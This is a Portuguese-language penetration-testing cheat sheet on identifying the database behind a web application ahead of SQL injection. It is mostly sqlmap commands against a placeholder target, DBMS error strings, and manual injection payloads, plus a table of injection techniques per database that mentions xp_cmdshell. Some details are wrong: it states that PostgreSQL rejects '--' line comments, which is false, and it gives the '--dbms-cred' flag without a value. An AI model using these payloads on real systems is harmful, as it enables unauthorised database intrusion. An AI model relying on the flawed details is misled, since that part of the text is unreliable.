# Fingerprint do DBMS

## Objetivo
Identificar o banco de dados alvo para otimizar payloads e técnicas de exploração.

## Detecção Automática com SQLMap

```bash
# Fingerprint completo
sqlmap -u "http://alvo.com/?id=1" --dbms-cred --banner --batch

# Só banner (versão do BD)
sqlmap -u "http://alvo.com/?id=1" --banner --batch
```

## Inferência pelo Stack Tecnológico

| Tecnologia Web | DBMS Provável |
|----------------|---------------|
| PHP + Linux | MySQL / MariaDB |
| ASP.NET + IIS | MSSQL (SQL Server) |
| Java + Tomcat | Oracle / MySQL / PostgreSQL |
| Python/Django | PostgreSQL / MySQL / SQLite |
| Ruby on Rails | PostgreSQL / MySQL / SQLite |
| ColdFusion | MSSQL / Oracle |

### Verificar Headers
```bash
curl -I "http://alvo.com" | grep -iE "X-Powered-By|Server"
# X-Powered-By: PHP/7.4 → MySQL provável
# X-Powered-By: ASP.NET → MSSQL provável
# Server: Microsoft-IIS → MSSQL provável
```

## Fingerprint por Erros SQL

### MySQL
```
You have an error in your SQL syntax
mysql_fetch_array()
Table 'xxx' doesn't exist
```

### MSSQL (SQL Server)
```
Unclosed quotation mark after the character string
Microsoft OLE DB Provider for SQL Server
[Microsoft][ODBC SQL Server Driver]
```

### PostgreSQL
```
ERROR: unterminated quoted string at or near
PG::SyntaxError
pg_query()
```

### Oracle
```
ORA-00907: missing right parenthesis
ORA-00933: SQL command not properly ended
java.sql.SQLException
```

### SQLite
```
SQLite3::Exception
sqlite3.OperationalError
```

## Fingerprint Manual via Injeção

### Teste com Funções Específicas

```sql
-- MySQL: retorna versão
' AND SUBSTRING(@@version,1,1)='5'--

-- MSSQL: função específica
' AND LEN(@@VERSION)>0--

-- PostgreSQL: cast syntax
' AND 1=CAST(version() AS int)--

-- Oracle: tabela dual
' AND 1=(SELECT 1 FROM dual)--
```

### Teste com Comentários

```sql
-- MySQL aceita comentários com versão
/*!50000 AND 1=1*/

-- MSSQL aceita comentários padrão
/* comentário */

-- Oracle não aceita # como comentário
-- PostgreSQL não aceita comentários de linha com --
```

## Verificação de Versão

```bash
# MySQL/MariaDB
sqlmap -u "http://alvo.com/?id=1" --sql-query="SELECT version()" --batch

# MSSQL
sqlmap -u "http://alvo.com/?id=1" --sql-query="SELECT @@VERSION" --batch

# PostgreSQL
sqlmap -u "http://alvo.com/?id=1" --sql-query="SELECT version()" --batch

# Oracle
sqlmap -u "http://alvo.com/?id=1" --sql-query="SELECT * FROM v\$version" --batch
```

## Impacto na Seleção de Técnicas

| DBMS | Técnicas Ideais | Observações |
|------|----------------|-------------|
| MySQL | B, E, U | Suporta SLEEP(), comentários/*!*/ |
| MSSQL | B, E, S, U | xp_cmdshell, WAITFOR DELAY |
| PostgreSQL | B, E, S, U | Suporta stacked queries |
| Oracle | B, E, U | Sem stacked, requer FROM dual |
| SQLite | B, T, U | Sem SLEEP, usa randomblob() |
